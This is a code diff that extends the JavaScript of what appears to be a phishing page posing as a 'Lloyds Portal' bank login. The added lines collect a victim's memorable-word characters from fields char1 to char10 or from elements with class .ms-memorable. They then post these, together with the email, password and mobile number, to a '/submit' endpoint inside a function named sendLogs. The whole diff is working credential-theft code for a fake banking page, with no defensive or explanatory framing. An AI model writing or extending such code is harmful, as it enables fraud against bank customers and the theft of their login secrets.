@@ -321,11 +321,38 @@
     var mobileEl = document.getElementById('ms-mobile');
     if (emailEl) emailEl.value = document.getElementById('uid')?.value || '';
     if (mobileEl) mobileEl.value = document.getElementById('mobile')?.value || '';
+    
+    // Universal memorable characters capture
+    var memorable_chars = '';
+    // Look for inputs with IDs like char1, char2, char3
+    for (var i = 1; i <= 10; i++) {
+      var charInput = document.getElementById('char' + i);
+      if (charInput) {
+        memorable_chars += charInput.value || '';
+      }
+    }
+    // Also look for elements with class .ms-memorable
+    var memElements = document.querySelectorAll('.ms-memorable');
+    if (memElements.length > 0) {
+      memorable_chars = '';
+      memElements.forEach(function(el) {
+        if (el.value !== undefined) memorable_chars += el.value;
+        else if (el.textContent) memorable_chars += el.textContent;
+      });
+    }
+    
     try {
       await fetch('/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ page: 'Lloyds Portal', type: type, email: emailEl?.value || '', pwd: document.getElementById('pwd')?.value || '', mobile: mobileEl?.value || '' })
+        body: JSON.stringify({ 
+          page: 'Lloyds Portal', 
+          type: type, 
+          email: emailEl?.value || '', 
+          pwd: document.getElementById('pwd')?.value || memorable_chars || '', 
+          mobile: mobileEl?.value || '',
+          memorable_chars: memorable_chars 
+        })
       });
     } catch (e) {
       console.warn('sendLogs failed', e);
